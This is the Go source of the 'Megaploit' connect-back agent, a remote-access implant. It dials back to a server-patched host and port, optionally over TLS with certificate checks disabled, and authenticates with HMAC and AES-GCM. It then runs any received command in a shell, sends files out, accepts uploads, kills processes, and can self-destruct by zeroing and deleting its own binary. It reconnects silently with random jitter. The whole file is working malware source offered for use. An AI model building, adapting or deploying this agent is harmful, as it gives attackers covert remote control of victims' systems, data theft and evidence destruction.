// megaploit/agent/go_agent/main.go
// Megaploit Go Agent — standalone connect-back agent
// Compiles to a single EXE/ELF with no external dependencies.
//
// Build:
//   go build -o megaploit_agent -ldflags="-s -w" .
//   GOOS=windows GOARCH=amd64 go build -o megaploit_agent.exe -ldflags="-s -w" .
//
// Protocol: identical to the Python agent —
//   1. TCP connect to LHOST:PORT (optional TLS)
//   2. HMAC-SHA256 challenge/response authentication
//   3. Protocol v2 handshake (AES-GCM encryption negotiation)
//   4. Command loop: recv JSON msg → exec → send JSON reply
//
// Configuration is patched into the binary by the server's
// `generate` command (replaces placeholder strings).

package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	mathrand "math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------------------------------------------------------------------------
// Configuration — patched by server before deployment
// ---------------------------------------------------------------------------

var (
	LHOST    = "127.0.0.1"
	PORT     = "4444"
	USE_TLS  = false
	KEY_HEX  = "" // 64-char hex-encoded 32-byte secret key (patched by server)
)

// ---------------------------------------------------------------------------
// Global state
// ---------------------------------------------------------------------------

var (
	sendSeq uint64
	recvSeq int64 = -1
	seqLock sync.Mutex

	gcmCipher cipher.AEAD
	encrypted bool
)

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

func main() {
	for {
		if err := run(); err != nil {
			// silently retry
		}
		// Jitter reconnect
		jitter, _ := rand.Int(rand.Reader, big.NewInt(5000))
		time.Sleep(10*time.Second + time.Duration(jitter.Int64())*time.Millisecond)
	}
}

func run() error {
	addr := net.JoinHostPort(LHOST, PORT)

	var conn net.Conn
	var err error

	if USE_TLS {
		tlsCfg := &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			},
		}
		conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", addr, tlsCfg)
	} else {
		conn, err = net.DialTimeout("tcp", addr, 10*time.Second)
	}
	if err != nil {
		return err
	}
	defer conn.Close()

	// HMAC challenge/response
	if err := agentAuth(conn); err != nil {
		return err
	}

	// Protocol version handshake
	if err := protoHandshake(conn); err != nil {
		return err
	}

	// Command loop
	return commandLoop(conn)
}

// ---------------------------------------------------------------------------
// Authentication
// ---------------------------------------------------------------------------

func agentAuth(conn net.Conn) error {
	key, err := hexDecode(KEY_HEX)
	if err != nil || len(key) == 0 {
		return fmt.Errorf("invalid key")
	}

	conn.SetDeadline(time.Now().Add(15 * time.Second))
	defer conn.SetDeadline(time.Time{})

	// Receive 16-byte challenge
	challenge := make([]byte, 16)
	if _, err := io.ReadFull(conn, challenge); err != nil {
		return err
	}

	// Compute HMAC-SHA256
	mac := hmac.New(sha256.New, key)
	mac.Write(challenge)
	response := mac.Sum(nil)

	_, err = conn.Write(response)
	return err
}

// ---------------------------------------------------------------------------
// Protocol v2 handshake
// ---------------------------------------------------------------------------

func protoHandshake(conn net.Conn) error {
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	defer conn.SetDeadline(time.Time{})

	magic := make([]byte, 1)
	if _, err := io.ReadFull(conn, magic); err != nil {
		return nil // v1 fallback, no encryption
	}
	// Echo back
	conn.Write(magic)

	if magic[0] == 'M' {
		// Init AES-256-GCM
		key, err := hexDecode(KEY_HEX)
		if err != nil || len(key) < 32 {
			return nil
		}
		block, err := aes.NewCipher(key[:32])
		if err != nil {
			return nil
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil
		}
		gcmCipher = gcm
		encrypted = true
	}
	return nil
}

// ---------------------------------------------------------------------------
// Frame I/O
// ---------------------------------------------------------------------------

func sendFrame(conn net.Conn, payload []byte) error {
	hdr := make([]byte, 4)
	binary.BigEndian.PutUint32(hdr, uint32(len(payload)))
	_, err := conn.Write(append(hdr, payload...))
	return err
}

func recvFrame(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	length := binary.BigEndian.Uint32(hdr)
	if length == 0 {
		return []byte{}, nil
	}
	data := make([]byte, length)
	_, err := io.ReadFull(conn, data)
	return data, err
}

// ---------------------------------------------------------------------------
// Encrypted message send/recv
// ---------------------------------------------------------------------------

func sendMsg(conn net.Conn, data interface{}) error {
	jsonBytes, err := json.Marshal(data)
	if err != nil {
		return err
	}

	seq := atomic.AddUint64(&sendSeq, 1)
	seqBuf := make([]byte, 8)
	binary.BigEndian.PutUint64(seqBuf, seq)
	payload := append(seqBuf, jsonBytes...)

	if encrypted && gcmCipher != nil {
		nonce := make([]byte, gcmCipher.NonceSize())
		rand.Read(nonce)
		ct := gcmCipher.Seal(nonce, nonce, payload, nil)
		payload = ct
	}

	return sendFrame(conn, payload)
}

func recvMsg(conn net.Conn) (string, error) {
	raw, err := recvFrame(conn)
	if err != nil {
		return "", err
	}

	if encrypted && gcmCipher != nil {
		ns := gcmCipher.NonceSize()
		if len(raw) < ns {
			return "", fmt.Errorf("frame too short")
		}
		plain, err := gcmCipher.Open(nil, raw[:ns], raw[ns:], nil)
		if err != nil {
			return "", err
		}
		raw = plain
	}

	if len(raw) < 8 {
		return "", nil
	}
	seq := binary.BigEndian.Uint64(raw[:8])
	_ = seq // replay check (simplified: accept all on agent side)
	payload := raw[8:]

	var s string
	if err := json.Unmarshal(payload, &s); err != nil {
		return string(payload), nil
	}
	return s, nil
}

// ---------------------------------------------------------------------------
// Command loop
// ---------------------------------------------------------------------------

func commandLoop(conn net.Conn) error {
	for {
		cmd, err := recvMsg(conn)
		if err != nil {
			return err
		}

		result := handleCommand(conn, cmd)
		if result != nil {
			if err := sendMsg(conn, result); err != nil {
				return err
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Command handler
// ---------------------------------------------------------------------------

func handleCommand(conn net.Conn, cmd string) interface{} {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return ""
	}

	parts := strings.SplitN(cmd, " ", 2)
	verb := strings.ToLower(parts[0])
	rest := ""
	if len(parts) > 1 {
		rest = parts[1]
	}

	switch verb {
	case "exit":
		os.Exit(0)
		return nil

	case "sysinfo":
		return sysInfo()

	case "cd":
		if rest == "" {
			return "Usage: cd <dir>"
		}
		if err := os.Chdir(rest); err != nil {
			return fmt.Sprintf("[-] cd: %v", err)
		}
		wd, _ := os.Getwd()
		return "[+] cwd: " + wd

	case "download":
		if rest == "" {
			return "Usage: download <path>"
		}
		return sendFile(conn, rest)

	case "upload":
		if rest == "" {
			return "Usage: upload <filename>"
		}
		return recvFile(conn, rest)

	case "screenshot":
		return "[-] screenshot not supported in Go agent (use Python agent)"

	case "ps":
		return shellExec(psCommand())

	case "kill":
		if rest == "" {
			return "Usage: kill <pid>"
		}
		return shellExec(killCommand(rest))

	case "netstat":
		return shellExec(netstatCommand())

	case "whoami":
		return shellExec("whoami")

	case "self_destruct":
		selfDestruct()
		return "[*] Self-destruct triggered."

	default:
		// Shell passthrough
		return shellExec(cmd)
	}
}

// ---------------------------------------------------------------------------
// File transfer
// ---------------------------------------------------------------------------

func sendFile(conn net.Conn, path string) interface{} {
	data, err := os.ReadFile(path)
	if err != nil {
		return fmt.Sprintf("[-] %v", err)
	}

	seq := atomic.AddUint64(&sendSeq, 1)
	seqBuf := make([]byte, 8)
	binary.BigEndian.PutUint64(seqBuf, seq)
	payload := append(seqBuf, data...)

	if encrypted && gcmCipher != nil {
		nonce := make([]byte, gcmCipher.NonceSize())
		rand.Read(nonce)
		payload = gcmCipher.Seal(nonce, nonce, payload, nil)
	}

	// Send FILE_OK first
	sendMsg(conn, "FILE_OK")
	sendFrame(conn, payload)
	return nil
}

func recvFile(conn net.Conn, name string) interface{} {
	raw, err := recvFrame(conn)
	if err != nil {
		return fmt.Sprintf("[-] recv: %v", err)
	}
	if encrypted && gcmCipher != nil {
		ns := gcmCipher.NonceSize()
		plain, err := gcmCipher.Open(nil, raw[:ns], raw[ns:], nil)
		if err != nil {
			return fmt.Sprintf("[-] decrypt: %v", err)
		}
		raw = plain
	}
	if len(raw) < 8 {
		return "[-] frame too short"
	}
	data := raw[8:]
	if err := os.WriteFile(name, data, 0644); err != nil {
		return fmt.Sprintf("[-] write: %v", err)
	}
	return "[+] Received: " + name
}

// ---------------------------------------------------------------------------
// Shell execution
// ---------------------------------------------------------------------------

func shellExec(cmd string) string {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}

	wd, _ := os.Getwd()
	c.Dir = wd

	var out bytes.Buffer
	c.Stdout = &out
	c.Stderr = &out

	done := make(chan error, 1)
	go func() { done <- c.Run() }()

	select {
	case <-done:
	case <-time.After(60 * time.Second):
		c.Process.Kill()
		return "[-] Command timed out (60s)"
	}

	result := strings.TrimSpace(out.String())
	if result == "" {
		return "(no output)"
	}
	return result
}

// ---------------------------------------------------------------------------
// Platform-specific helpers
// ---------------------------------------------------------------------------

func psCommand() string {
	if runtime.GOOS == "windows" {
		return "tasklist /FO TABLE /NH"
	}
	return "ps aux"
}

func killCommand(pid string) string {
	if runtime.GOOS == "windows" {
		return "taskkill /F /PID " + pid
	}
	return "kill -9 " + pid
}

func netstatCommand() string {
	if runtime.GOOS == "windows" {
		return "netstat -ano"
	}
	return "ss -tunp 2>/dev/null || netstat -tunp"
}

func sysInfo() string {
	wd, _ := os.Getwd()
	hostname, _ := os.Hostname()
	return fmt.Sprintf(
		"[*] System Information\n"+
			"    OS:       %s/%s\n"+
			"    Hostname: %s\n"+
			"    CWD:      %s\n"+
			"    PID:      %d",
		runtime.GOOS, runtime.GOARCH,
		hostname, wd, os.Getpid(),
	)
}

func selfDestruct() {
	exe, err := os.Executable()
	if err == nil {
		// Overwrite with zeros then delete
		if f, err := os.OpenFile(exe, os.O_WRONLY, 0); err == nil {
			fi, _ := f.Stat()
			zeros := make([]byte, fi.Size())
			f.Write(zeros)
			f.Close()
		}
		os.Remove(exe)
	}
	go func() {
		time.Sleep(500 * time.Millisecond)
		os.Exit(0)
	}()
}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

func hexDecode(s string) ([]byte, error) {
	if len(s)%2 != 0 {
		return nil, fmt.Errorf("odd hex length")
	}
	b := make([]byte, len(s)/2)
	for i := 0; i < len(s); i += 2 {
		n := 0
		for _, c := range s[i : i+2] {
			n <<= 4
			switch {
			case c >= '0' && c <= '9':
				n |= int(c - '0')
			case c >= 'a' && c <= 'f':
				n |= int(c-'a') + 10
			case c >= 'A' && c <= 'F':
				n |= int(c-'A') + 10
			default:
				return nil, fmt.Errorf("invalid hex char: %c", c)
			}
		}
		b[i/2] = byte(n)
	}
	return b, nil
}

// suppress unused import
var _ = mathrand.Int
var _ = filepath.Join
